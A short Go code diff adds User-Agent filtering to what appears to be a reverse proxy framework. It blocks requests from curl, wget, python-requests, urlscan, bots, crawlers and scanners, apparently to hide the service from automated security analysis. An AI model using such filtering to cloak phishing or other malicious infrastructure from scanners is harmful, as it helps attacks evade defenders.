@@ -197,6 +197,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+			// --- START USER-AGENT FILTERING ---
+			blockedUserAgents := []string{
+				"curl",
+				"wget",
+				"python-requests",
+				"Go-http-client",
+				"urlscan",
+				"bot",
+				"crawler",
+				"scanner",
+			}
+
+			userAgent := req.Header.Get("User-Agent")
+			for _, blocked := range blockedUserAgents {
+				if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
+					log.Warning("blacklist: request from blocked user-agent '%s' was blocked", userAgent)
+					return p.blockRequest(req)
+				}
+			}
+			// --- END USER-AGENT FILTERING ---
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
